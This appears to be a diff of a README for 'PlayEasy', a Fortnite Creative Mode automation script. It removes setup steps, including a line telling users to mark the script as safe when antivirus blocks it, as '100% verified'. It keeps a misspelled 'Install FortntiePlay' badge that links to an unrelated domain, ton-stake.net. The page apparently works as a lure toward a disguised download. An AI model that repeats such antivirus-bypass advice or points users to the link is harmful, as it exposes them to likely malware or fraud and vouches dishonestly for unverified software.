@@ -24,41 +24,6 @@ This script is intended for Fortnite Creative Mode only and complies with Epic G
 
 ---
 
-## 📋 Getting Started Guide  
-
-Start your coding and building journey with these simple steps! 🛠️  
-
-1. **Access the Script** 📥  
-   Clone or download the PlayEasy script from this repository using the "Get Started" button.  
-
-2. **System Requirements Check** 💻  
-   Ensure your system meets the following requirements:  
-   - Fortnite (Chapter 6, 2025) installed with Creative Mode access.  
-   - Python 3.8+ with `pyautogui` and `keyboard` libraries (install via `pip install pyautogui keyboard`).  
-   - Windows 10/11 or macOS 10.13+ with 4GB RAM (8GB recommended).  
-
-3. **Install Dependencies** 📂  
-   Open a terminal and run:  
-   ```
-   pip install pyautogui keyboard
-   ```  
-   This installs the Python libraries needed for the script.  
-
-4. **Configure the Script** ⚙️  
-   Open `playeasy.py` in a text editor. Adjust the `BUILD_COORDINATES` and `BUILD_INTERVAL` variables to match your Creative Mode setup (see script comments for guidance).  
-
-5. **Run the Script** 🚀  
-   Launch Fortnite, enter a Creative Mode world, and run the script using:  
-   ```
-   python playeasy.py
-   ```  
-   Press `q` to stop the script at any time.  
-
-6. **Troubleshooting** ❓  
-   - Ensure Fortnite is in focus when running the script.  
-   - Verify your coordinates in `playeasy.py` using a tool like Windows Snipping Tool.  
-   - If blocked by antivirus, mark the script as safe (it’s 100% verified).  
-   - Consult community guides or open an issue in the repository for support.  
 
 [![Install FortntiePlay](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
